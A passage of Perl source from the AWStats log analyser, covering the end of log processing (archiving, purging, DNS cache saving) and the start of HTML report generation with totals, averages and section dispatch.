)\n\t\t\t  . \" _host_h:\"\n\t\t\t  . ( scalar keys %_host_h )\n\t\t\t  . \" _host_k:\"\n\t\t\t  . ( scalar keys %_host_k )\n\t\t\t  . \" _host_l:\"\n\t\t\t  . ( scalar keys %_host_l )\n\t\t\t  . \" _host_s:\"\n\t\t\t  . ( scalar keys %_host_s )\n\t\t\t  . \" _host_u:\"\n\t\t\t  . ( scalar keys %_host_u ) . \"\\n\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\t\t\t\" _url_p:\"\n\t\t\t  . ( scalar keys %_url_p )\n\t\t\t  . \" _url_k:\"\n\t\t\t  . ( scalar keys %_url_k )\n\t\t\t  . \" _url_e:\"\n\t\t\t  . ( scalar keys %_url_e )\n\t\t\t  . \" _url_x:\"\n\t\t\t  . ( scalar keys %_url_x ) . \"\\n\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\t\t\t\" _waithost_e:\"\n\t\t\t  . ( scalar keys %_waithost_e )\n\t\t\t  . \" _waithost_l:\"\n\t\t\t  . ( scalar keys %_waithost_l )\n\t\t\t  . \" _waithost_s:\"\n\t\t\t  . ( scalar keys %_waithost_s )\n\t\t\t  . \" _waithost_u:\"\n\t\t\t  . ( scalar keys %_waithost_u ) . \"\\n\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\t\t\t\"End of processing log file (AWStats memory cache is TmpDNSLookup=\"\n\t\t\t  . ( scalar keys %TmpDNSLookup )\n\t\t\t  . \" TmpBrowser=\"\n\t\t\t  . ( scalar keys %TmpBrowser )\n\t\t\t  . \" TmpOS=\"\n\t\t\t  . ( scalar keys %TmpOS )\n\t\t\t  . \" TmpRefererServer=\"\n\t\t\t  . ( scalar keys %TmpRefererServer )\n\t\t\t  . \" TmpRobot=\"\n\t\t\t  . ( scalar keys %TmpRobot ) . \")\",\n\t\t\t1\n\t\t);\n\t}\n\n# Save current processed break section\n# If lastprocesseddate > 0 means there is at least one approved new record in log or at least one existing history file\n\tif ( $lastprocesseddate > 0 )\n\t{\n\t    # TODO: Do not save if we are sure a flush was just already done\n\t\t# Get last line\n\t\tseek( LOG, $lastlineoffset, 0 );\n\t\tmy $line = <LOG>;\n\t\tchomp $line;\n\t\t$line =~ s/\\r$//;\n\t\tif ( !$NbOfLinesParsed ) \n\t\t{\n            # TODO If there was no lines parsed (log was empty), we only update LastUpdate line with YYYYMMDDHHMMSS 0 0 0 0 0\n\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t\t$lastprocessedday,  $lastprocessedhour,\n\t\t\t\t1,                  1,\n\t\t\t\t\"all\", ( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t$lastlineoffset, &CheckSum($line)\n\t\t\t);\n\t\t}\n\t\telse {\n\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t\t$lastprocessedday,  $lastprocessedhour,\n\t\t\t\t1,                  1,\n\t\t\t\t\"all\", ( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t$lastlineoffset, &CheckSum($line)\n\t\t\t);\n\t\t}\n\t}\n\n\tif ($Debug) { debug(\"Close log file \\\"$LogFile\\\"\"); }\n\tclose LOG || error(\"Command for pipe '$LogFile' failed\");\n\n\t# Process the Rename - Archive - Purge phase\n\tmy $renameok  = 1;\n\tmy $archiveok = 1;\n\n\t# Open Log file for writing if PurgeLogFile is on\n\tif ($PurgeLogFile) {\n\t\tif ($ArchiveLogRecords) {\n\t\t\tif ( $ArchiveLogRecords == 1 ) {    # For backward compatibility\n\t\t\t\t$ArchiveFileName = \"$DirData/${PROG}_archive$FileSuffix.log\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\t$ArchiveFileName =\n\t\t\t\t  \"$DirData/${PROG}_archive$FileSuffix.\"\n\t\t\t\t  . &Substitute_Tags($ArchiveLogRecords) . \".log\";\n\t\t\t}\n\t\t\topen( LOG, \"+<$LogFile\" )\n\t\t\t  || error(\n\"Enable to archive log records of \\\"$LogFile\\\" into \\\"$ArchiveFileName\\\" because source can't be opened for read and write: $!<br />\\n\"\n\t\t\t  );\n\t\t}\n\t\telse {\n\t\t\topen( LOG, \"+<$LogFile\" );\n\t\t}\n\t\tbinmode LOG;\n\t}\n\n\t# Rename all HISTORYTMP files into HISTORYTXT\n\t&Rename_All_Tmp_History();\n\n\t# Purge Log file if option is on and all renaming are ok\n\tif ($PurgeLogFile) {\n\n\t\t# Archive LOG file into ARCHIVELOG\n\t\tif ($ArchiveLogRecords) {\n\t\t\tif ($Debug) { debug(\"Start of archiving log file\"); }\n\t\t\topen( ARCHIVELOG, \">>$ArchiveFileName\" )\n\t\t\t  || error(\n\t\t\t\t\"Couldn't open file \\\"$ArchiveFileName\\\" to archive log: $!\");\n\t\t\tbinmode ARCHIVELOG;\n\t\t\twhile (<LOG>) {\n\t\t\t\tif ( !print ARCHIVELOG $_ ) { $archiveok = 0; last; }\n\t\t\t}\n\t\t\tclose(ARCHIVELOG)\n\t\t\t  || error(\"Archiving failed during closing archive: $!\");\n\t\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\t\tchmod 0666, \"$ArchiveFileName\";\n\t\t\t}\n\t\t\tif ($Debug) { debug(\"End of archiving log file\"); }\n\t\t}\n\n\t\t# If rename and archive ok\n\t\tif ( $renameok && $archiveok ) {\n\t\t\tif ($Debug) { debug(\"Purge log file\"); }\n\t\t\tmy $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );\n\t\t\tmy $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );\n\t\t\tmy $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );\n\t\t\ttruncate( LOG, 0 )\n\t\t\t  || warning(\n\"Warning: $bold$PROG$unbold couldn't purge logfile \\\"$bold$LogFile$unbold\\\".$br\\nChange your logfile permissions to allow write for your web server CGI process or change PurgeLogFile=1 into PurgeLogFile=0 in configure file and think to purge sometimes manually your logfile (just after running an update process to not loose any not already processed records your log file contains).\"\n\t\t\t  );\n\t\t}\n\t\tclose(LOG);\n\t}\n\n\tif ( $DNSLookup == 1 && $DNSLookupAlreadyDone ) {\n\n\t\t# DNSLookup warning\n\t\tmy $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );\n\t\tmy $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );\n\t\tmy $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );\n\t\twarning(\n\"Warning: $bold$PROG$unbold has detected that some hosts names were already resolved in your logfile $bold$DNSLookupAlreadyDone$unbold.$br\\nIf DNS lookup was already made by the logger (web server), you should change your setup DNSLookup=$DNSLookup into DNSLookup=0 to increase $PROG speed.\"\n\t\t);\n\t}\n\tif ( $DNSLookup == 1 && $NbOfNewLines ) {\n\n\t\t# Save new DNS last update cache file\n\t\tSave_DNS_Cache_File( \\%TmpDNSLookup, \"$DirData/$DNSLastUpdateCacheFile\",\n\t\t\t\"$FileSuffix\" );    # Save into file using FileSuffix\n\t}\n\n\tif ($EnableLockForUpdate) {\n\n\t\t# Remove lock\n\t\t&Lock_Update(0);\n\n\t\t# Restore signals handler\n\t\t$SIG{INT} = 'DEFAULT';    # 2\n\t\t                          #$SIG{KILL} = 'DEFAULT';\t# 9\n\t\t                          #$SIG{TERM} = 'DEFAULT';\t# 15\n\t}\n\n}\n\n# End of log processing if ($UPdateStats)\n\n#---------------------------------------------------------------------\n# SHOW REPORT\n#---------------------------------------------------------------------\n\nif ( scalar keys %HTMLOutput ) {\n\n\tdebug( \"YearRequired=$YearRequired, MonthRequired=$MonthRequired\", 2 );\n\tdebug( \"DayRequired=$DayRequired, HourRequired=$HourRequired\",     2 );\n\n\t# Define the NewLinkParams for main chart\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)output(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\tmy $NewLinkTarget = '';\n\tif ($DetailedReportsOnNewWindows) {\n\t\t$NewLinkTarget = \" target=\\\"awstatsbis\\\"\";\n\t}\n\tif ( ( $FrameName eq 'mainleft' || $FrameName eq 'mainright' )\n\t\t&& $DetailedReportsOnNewWindows < 2 )\n\t{\n\t\t$NewLinkParams .= \"&amp;framename=mainright\";\n\t\t$NewLinkTarget = \" target=\\\"mainright\\\"\";\n\t}\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\n\tif ( $FrameName ne 'mainleft' ) {\n\n\t\t# READING DATA\n\t\t#-------------\n\t\t&Init_HashArray();\n\n\t\t# Lecture des fichiers history / reading history file\n\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\tfor ( my $ix = 12 ; $ix >= 1 ; $ix-- ) {\n\t\t\t\tmy $stringforload = '';\n\t\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\t\tif ( $MonthRequired eq 'all' || $monthix eq $MonthRequired ) {\n\t\t\t\t\t$stringforload = 'all';    # Read full history file\n\t\t\t\t}\n\t\t\t\telsif ( ( $HTMLOutput{'main'} && $ShowMonthStats )\n\t\t\t\t\t|| $HTMLOutput{'alldays'} )\n\t\t\t\t{\n\t\t\t\t\t$stringforload =\n\t\t\t\t\t  'general time';          # Read general and time sections.\n\t\t\t\t}\n\t\t\t\tif ($stringforload) {\n\n\t\t\t\t\t# On charge fichier / file is loaded\n\t\t\t\t\t&Read_History_With_TmpUpdate( $YearRequired, $monthix, '',\n\t\t\t\t\t\t'', 0, 0, $stringforload );\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif ( $DatabaseBreak eq 'day' ) {\n\t\t\tmy $stringforload = 'all';\n\t\t\tmy $monthix       = sprintf( \"%02s\", $MonthRequired );\n\t\t\tmy $dayix         = sprintf( \"%02s\", $DayRequired );\n\t\t\t&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix, '',\n\t\t\t\t0, 0, $stringforload );\n\t\t}\n\t\tif ( $DatabaseBreak eq 'hour' ) {\n\t\t\tmy $stringforload = 'all';\n\t\t\tmy $monthix       = sprintf( \"%02s\", $MonthRequired );\n\t\t\tmy $dayix         = sprintf( \"%02s\", $DayRequired );\n\t\t\tmy $hourix        = sprintf( \"%02s\", $HourRequired );\n\t\t\t&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix,\n\t\t\t\t$hourix, 0, 0, $stringforload );\n\t\t}\n\n\t}\n\n\t# HTMLHeadSection\n\tif ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {\n\t\tprint \"<a name=\\\"top\\\"></a>\\n\\n\";\n\t\tmy $newhead = $HTMLHeadSection;\n\t\t$newhead =~ s/\\\\n/\\n/g;\n\t\tprint \"$newhead\\n\";\n\t\tprint \"\\n\";\n\t}\n\n\t# Call to plugins' function AddHTMLBodyHeader\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyHeader'} } ) {\n\t\tmy $function = \"AddHTMLBodyHeader_$pluginname\";\n\t\t&$function();\n\t}\n\n\tmy $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );\n\n\t# TOP BAN\n\t#---------------------------------------------------------------------\n\tif ( $ShowMenu || $FrameName eq 'mainleft' ) {\n\t\tHTMLTopBanner($WIDTHMENU1);\n\t}\n\n\t# Call to plugins' function AddHTMLMenuHeader\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuHeader'} } ) {\n\t\tmy $function = \"AddHTMLMenuHeader_$pluginname\";\n\t\t&$function();\n\t}\n\n\t# MENU (ON LEFT IF FRAME OR TOP)\n\t#---------------------------------------------------------------------\n\tif ( $ShowMenu || $FrameName eq 'mainleft' ) {\n\t\tHTMLMenu($NewLinkParams, $NewLinkTarget);\n\t}\n\n\t# Call to plugins' function AddHTMLMenuFooter\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuFooter'} } ) {\n\t\tmy $function = \"AddHTMLMenuFooter_$pluginname\";\n\t\t&$function();\n\t}\n\n\t# Exit if left frame\n\tif ( $FrameName eq 'mainleft' ) {\n\t\t&html_end(0);\n\t\texit 0;\n\t}\n\n\t\n\n# TotalVisits TotalUnique TotalPages TotalHits TotalBytes TotalHostsKnown TotalHostsUnknown\n\t$TotalUnique = $TotalVisits = $TotalPages = $TotalHits = $TotalBytes = 0;\n\t$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;\n\t$TotalHostsKnown = $TotalHostsUnknown = 0;\n\tmy $beginmonth = $MonthRequired;\n\tmy $endmonth   = $MonthRequired;\n\tif ( $MonthRequired eq 'all' ) { $beginmonth = 1; $endmonth = 12; }\n\tfor ( my $month = $beginmonth ; $month <= $endmonth ; $month++ ) {\n\t\tmy $monthix = sprintf( \"%02s\", $month );\n\t\t$TotalHostsKnown += $MonthHostsKnown{ $YearRequired . $monthix }\n\t\t  || 0;    # Wrong in year view\n\t\t$TotalHostsUnknown += $MonthHostsUnknown{ $YearRequired . $monthix }\n\t\t  || 0;    # Wrong in year view\n\t\t$TotalUnique += $MonthUnique{ $YearRequired . $monthix }\n\t\t  || 0;    # Wrong in year view\n\t\t$TotalVisits += $MonthVisits{ $YearRequired . $monthix }\n\t\t  || 0;    # Not completely true\n\t\t$TotalPages += $MonthPages{ $YearRequired . $monthix } || 0;\n\t\t$TotalHits  += $MonthHits{ $YearRequired . $monthix }  || 0;\n\t\t$TotalBytes += $MonthBytes{ $YearRequired . $monthix } || 0;\n\t\t$TotalNotViewedPages += $MonthNotViewedPages{ $YearRequired . $monthix }\n\t\t  || 0;\n\t\t$TotalNotViewedHits += $MonthNotViewedHits{ $YearRequired . $monthix }\n\t\t  || 0;\n\t\t$TotalNotViewedBytes += $MonthNotViewedBytes{ $YearRequired . $monthix }\n\t\t  || 0;\n\t}\n\n\t# TotalHitsErrors TotalBytesErrors\n\t$TotalHitsErrors  = 0;\n\tmy $TotalBytesErrors = 0;\n\tforeach ( keys %_errors_h ) {\n\n\t\t#\t\tprint \"xxxx\".$_.\" zzz\".$_errors_h{$_};\n\t\t$TotalHitsErrors  += $_errors_h{$_};\n\t\t$TotalBytesErrors += $_errors_k{$_};\n\t}\n\n# TotalEntries (if not already specifically counted, we init it from _url_e hash table)\n\tif ( !$TotalEntries ) {\n\t\tforeach ( keys %_url_e ) { $TotalEntries += $_url_e{$_}; }\n\t}\n\n# TotalExits (if not already specifically counted, we init it from _url_x hash table)\n\tif ( !$TotalExits ) {\n\t\tforeach ( keys %_url_x ) { $TotalExits += $_url_x{$_}; }\n\t}\n\n# TotalBytesPages (if not already specifically counted, we init it from _url_k hash table)\n\tif ( !$TotalBytesPages ) {\n\t\tforeach ( keys %_url_k ) { $TotalBytesPages += $_url_k{$_}; }\n\t}\n\n# TotalKeyphrases (if not already specifically counted, we init it from _keyphrases hash table)\n\tif ( !$TotalKeyphrases ) {\n\t\tforeach ( keys %_keyphrases ) { $TotalKeyphrases += $_keyphrases{$_}; }\n\t}\n\n# TotalKeywords (if not already specifically counted, we init it from _keywords hash table)\n\tif ( !$TotalKeywords ) {\n\t\tforeach ( keys %_keywords ) { $TotalKeywords += $_keywords{$_}; }\n\t}\n\n# TotalSearchEnginesPages (if not already specifically counted, we init it from _se_referrals_p hash table)\n\tif ( !$TotalSearchEnginesPages ) {\n\t\tforeach ( keys %_se_referrals_p ) {\n\t\t\t$TotalSearchEnginesPages += $_se_referrals_p{$_};\n\t\t}\n\t}\n\n# TotalSearchEnginesHits (if not already specifically counted, we init it from _se_referrals_h hash table)\n\tif ( !$TotalSearchEnginesHits ) {\n\t\tforeach ( keys %_se_referrals_h ) {\n\t\t\t$TotalSearchEnginesHits += $_se_referrals_h{$_};\n\t\t}\n\t}\n\n# TotalRefererPages (if not already specifically counted, we init it from _pagesrefs_p hash table)\n\tif ( !$TotalRefererPages ) {\n\t\tforeach ( keys %_pagesrefs_p ) {\n\t\t\t$TotalRefererPages += $_pagesrefs_p{$_};\n\t\t}\n\t}\n\n# TotalRefererHits (if not already specifically counted, we init it from _pagesrefs_h hash table)\n\tif ( !$TotalRefererHits ) {\n\t\tforeach ( keys %_pagesrefs_h ) {\n\t\t\t$TotalRefererHits += $_pagesrefs_h{$_};\n\t\t}\n\t}\n\n# TotalDifferentPages (if not already specifically counted, we init it from _url_p hash table)\n\t$TotalDifferentPages ||= scalar keys %_url_p;\n\n# TotalDifferentKeyphrases (if not already specifically counted, we init it from _keyphrases hash table)\n\t$TotalDifferentKeyphrases ||= scalar keys %_keyphrases;\n\n# TotalDifferentKeywords (if not already specifically counted, we init it from _keywords hash table)\n\t$TotalDifferentKeywords ||= scalar keys %_keywords;\n\n# TotalDifferentSearchEngines (if not already specifically counted, we init it from _se_referrals_h hash table)\n\t$TotalDifferentSearchEngines ||= scalar keys %_se_referrals_h;\n\n# TotalDifferentReferer (if not already specifically counted, we init it from _pagesrefs_h hash table)\n\t$TotalDifferentReferer ||= scalar keys %_pagesrefs_h;\n\n# Define firstdaytocountaverage, lastdaytocountaverage, firstdaytoshowtime, lastdaytoshowtime\n\tmy $firstdaytocountaverage =\n\t  $nowyear . $nowmonth . \"01\";    # Set day cursor to 1st day of month\n\tmy $firstdaytoshowtime =\n\t  $nowyear . $nowmonth . \"01\";    # Set day cursor to 1st day of month\n\tmy $lastdaytocountaverage =\n\t  $nowyear . $nowmonth . $nowday;    # Set day cursor to today\n\tmy $lastdaytoshowtime =\n\t  $nowyear . $nowmonth . \"31\";       # Set day cursor to last day of month\n\tif ( $MonthRequired eq 'all' ) {\n\t\t$firstdaytocountaverage =\n\t\t  $YearRequired\n\t\t  . \"0101\";    # Set day cursor to 1st day of the required year\n\t}\n\tif ( ( $MonthRequired ne $nowmonth && $MonthRequired ne 'all' )\n\t\t|| $YearRequired ne $nowyear )\n\t{\n\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t$firstdaytocountaverage =\n\t\t\t  $YearRequired\n\t\t\t  . \"0101\";    # Set day cursor to 1st day of the required year\n\t\t\t$firstdaytoshowtime =\n\t\t\t  $YearRequired . \"1201\"\n\t\t\t  ;    # Set day cursor to 1st day of last month of required year\n\t\t\t$lastdaytocountaverage =\n\t\t\t  $YearRequired\n\t\t\t  . \"1231\";    # Set day cursor to last day of the required year\n\t\t\t$lastdaytoshowtime =\n\t\t\t  $YearRequired . \"1231\"\n\t\t\t  ;    # Set day cursor to last day of last month of required year\n\t\t}\n\t\telse {\n\t\t\t$firstdaytocountaverage =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"01\";    # Set day cursor to 1st day of the required month\n\t\t\t$firstdaytoshowtime =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"01\";    # Set day cursor to 1st day of the required month\n\t\t\t$lastdaytocountaverage =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"31\";    # Set day cursor to last day of the required month\n\t\t\t$lastdaytoshowtime =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"31\";    # Set day cursor to last day of the required month\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"firstdaytocountaverage=$firstdaytocountaverage, lastdaytocountaverage=$lastdaytocountaverage\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\"firstdaytoshowtime=$firstdaytoshowtime, lastdaytoshowtime=$lastdaytoshowtime\",\n\t\t\t1\n\t\t);\n\t}\n\n\t# Call to plugins' function AddHTMLContentHeader\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLContentHeader'} } )\n\t{\n\t\t# to add unique visitors & number of visits, by J Ruano @ CAPSiDE\n\t\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_u\\\" width=\\\"80\\\">$Message[11]</th>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_v\\\" width=\\\"80\\\">$Message[10]</th>\";\n\t\t}\n\n\t\tmy $function = \"AddHTMLContentHeader_$pluginname\";\n\t\t&$function();\n\t}\n\n\t# Output individual frames or static pages for specific sections\n\t#-----------------------\n\tif ( scalar keys %HTMLOutput == 1 ) {\n\n\t\tif ( $HTMLOutput{'alldomains'} ) {\n\t\t\t&HTMLShowDomains();\n\t\t}\n\t\tif ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {\n\t\t\t&HTMLShowHosts();\n\t\t}\n\t\tif ( $HTMLOutput{'unknownip'} ) {\n\t\t\t&HTMLShowHostsUnknown();\n\t\t}\n\t\tif ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {\n\t\t\t&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );\n\t\t\t&html_end(1);\n\t\t}\n\t\tif ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {\n\t\t\t&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );\n\t\t\t&html_end(1);\n\t\t}\n\t\tif ( $HTMLOutput{'alllogins'} || $HTMLOutput{'lastlogins'} ) {\n\t\t\t&HTMLShowLogins();\n\t\t}\n\t\tif ( $HTMLOutput{'allrobots'} || $HTMLOutput{'lastrobots'} ) {\n\t\t\t&HTMLShowRobots();\n\t\t}\n\t\tif (   $HTMLOutput{'urldetail'}\n\t\t\t|| $HTMLOutput{'urlentry'}\n\t\t\t|| $HTMLOutput{'urlexit'} )\n\t\t{\n\t\t\t&HTMLShowURLDetail();\n\t\t}\n\t\tif ( $HTMLOutput{'unknownos'} ) {\n\t\t\t&HTMLShowOSUnknown($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'unknownbrowser'} ) {\n\t\t\t&HTMLShowBrowserUnknown($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'osdetail'} ) {\n\t\t\t&HTMLShowOSDetail();\n\t\t}\n\t\tif ( $HTMLOutput{'browserdetail'} ) {\n\t\t\t&HTMLShowBrowserDetail();\n\t\t}\n\t\tif ( $HTMLOutput{'refererse'} ) {\n\t\t\t&HTMLShowReferers($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'refererpages'} ) {\n\t\t\t&HTMLShowRefererPages($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'keyphrases'} ) {\n\t\t\t&HTMLShowKeyPhrases($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'keywords'} ) {\n\t\t\t&HTMLShowKeywords($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'downloads'} ) {\n\t\t\t&HTMLShowDownloads();\n\t\t}\n\t\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\tif ( $HTMLOutput{\"errors$code\"} ) {\n\t\t\t\t&HTMLShowErrorCodes($code);\n\t\t\t}\n\t\t}\n\n\t\t# BY EXTRA SECTIONS\n\t\t#----------------------------\n\t\tHTMLShowExtraSections();\n\t\t\n\t\tif ( $HTMLOutput{'info'} ) {\n\t\t\t# TODO Not yet available\n\t\t\tprint \"$Center<a name=\\\"info\\\">&nbsp;</a><br />\";\n\t\t\t&html_end(1);\n\t\t}\n\n\t\t# Print any plugins that have individual pages\n\t\t# TODO - change name, graph isn't so descriptive\n\t\tmy $htmloutput = '';\n\t\tforeach my $key ( keys %HTMLOutput ) { $htmloutput = $key; }\n\t\tif ( $htmloutput =~ /^plugin_(\\w+)$/ ) {\n\t\t\tmy $pluginname = $1;\n\t\t\tprint \"$Center<a name=\\\"plugin_$pluginname\\\">&nbsp;</a><br />\";\n\t\t\tmy $function = \"AddHTMLGraph_$pluginname\";\n\t\t\t&$function();\n\t\t\t&html_end(1);\n\t\t}\n\t}\n\n\t# Output main page\n\t#-----------------\n\tif ( $HTMLOutput{'main'} ) {\n\t\t\n\t\t# Calculate averages\n\t\tmy $max_p = 0;\n\t\tmy $max_h = 0;\n\t\tmy $max_k = 0;\n\t\tmy $max_v = 0;\n\t\tmy $average_nb = 0;\n\t\tforeach my $daycursor ($firstdaytocountaverage .. $lastdaytocountaverage )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}                 # If not an existing day, go to next\n\t\t\t$average_nb++;    # Increase number of day used to count\n\t\t\t$AverageVisits += ( $DayVisits{$daycursor} || 0 );\n\t\t\t$AveragePages += ( $DayPages{$daycursor}  || 0 );\n\t\t\t$AverageHits += ( $DayHits{$daycursor}   || 0 );\n\t\t\t$AverageBytes += ( $DayBytes{$daycursor}  || 0 );\n\t\t}\n\t\tif ($average_nb) {\n\t\t\t$AverageVisits = $AverageVisits / $average_nb;\n\t\t\t$AveragePages = $AveragePages / $average_nb;\n\t\t\t$AverageHits = $AverageHits / $average_nb;\n\t\t\t$AverageBytes = $AverageBytes / $average_nb;\n\t\t\tif ( $AverageVisits > $max_v ) { $max_v = $AverageVisits; }\n\t\t\t#if ($average_p > $max_p) { $max_p=$average_p; }\n\t\t\tif ( $AverageHits > $max_h ) { $max_h = $AverageHits; }\n\t\t\tif ( $AverageBytes > $max_k ) { $max_k = $AverageBytes; }\n\t\t}\n\t\telse {\n\t\t\t$AverageVisits = \"?\";\n\t\t\t$AveragePages = \"?\";\n\t\t\t$AverageHits = \"?\";\n\t\t\t$AverageBytes = \"?\";\n\t\t}\n\n\t\t# SUMMARY\n\t\t#---------------------------------------------------------------------\n\t\tif ($ShowSummary) {\n\t\t\t&HTMLMainSummary();\n\t\t}\n\n\t\t# BY MONTH\n\t\t#---------------------------------------------------------------------\n\t\tif ($ShowMonthStats) {\n\t\t\t&HTMLMainMonthly();\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"when\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY DAY OF MONTH\n\t\t#---------------------------------------------------------------------\n\t\tif ($ShowDaysOfMonthStats) {\n\t\t\t&HTMLMainDaily($firstdaytocountaverage, $lastdaytocountaverage,\n\t\t\t\t\t\t  $firstdaytoshowtime, $lastdaytoshowtime);\n\t\t}\n\n\t\t# BY DAY OF WEEK\n\t\t#-------------------------\n\t\tif ($ShowDaysOfWeekStats) {\n\t\t\t&HTMLMainDaysofWeek($firstdaytocountaverage, $lastdaytocountaverage, $NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY HOUR\n\t\t#----------------------------\n\t\tif ($ShowHoursStats) {\n\t\t\t&HTMLMainHours($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"who\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY COUNTRY/DOMAIN\n\t\t#---------------------------\n\t\tif ($ShowDomainsStats) {\n\t\t\t&HTMLMainCountries($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY HOST/VISITOR\n\t\t#--------------------------\n\t\tif ($ShowHostsStats) {\n\t\t\t&HTMLMainHosts($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY SENDER EMAIL\n\t\t#----------------------------\n\t\tif ($ShowEMailSenders) {\n\t\t\t&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );\n\t\t}\n\n\t\t# BY RECEIVER EMAIL\n\t\t#----------------------------\n\t\tif ($ShowEMailReceivers) {\n\t\t\t&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );\n\t\t}\n\n\t\t# BY LOGIN\n\t\t#----------------------------\n\t\tif ($ShowAuthenticatedUsers) {\n\t\t\t&HTMLMainLogins($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY ROBOTS\n\t\t#----------------------------\n\t\tif ($ShowRobotsStats) {\n\t\t\t&HTMLMainRobots($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY WORMS\n\t\t#----------------------------\n\t\tif ($ShowWormsStats) {\n\t\t\t&HTMLMainWorms();\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"how\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY SESSION\n\t\t#----------------------------\n\t\tif ($ShowSessionsStats) {\n\t\t\t&HTMLMainSessions();\n\t\t}\n\n\t\t# BY FILE TYPE\n\t\t#-------------------------\n\t\tif ($ShowFileTypesStats) {\n\t\t\t&HTMLMainFileType($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY FILE SIZE\n\t\t#-------------------------\n\t\tif ($ShowFileSizesStats) {\n\t\t\t# TODO\n\t\t}\n\t\t\n\t\t# BY DOWNLOADS\n\t\t#-------------------------\n\t\tif ($ShowDownloadsStats) {\n\t\t\t&HTMLMainDownloads($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY PAGE\n\t\t#-------------------------\n\t\tif ($ShowPagesStats) {\n\t\t\t&HTMLMainPages($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY OS\n\t\t#----------------------------\n\t\tif ($ShowOSStats) {\n\t\t\t&HTMLMainOS($NewLinkParams, 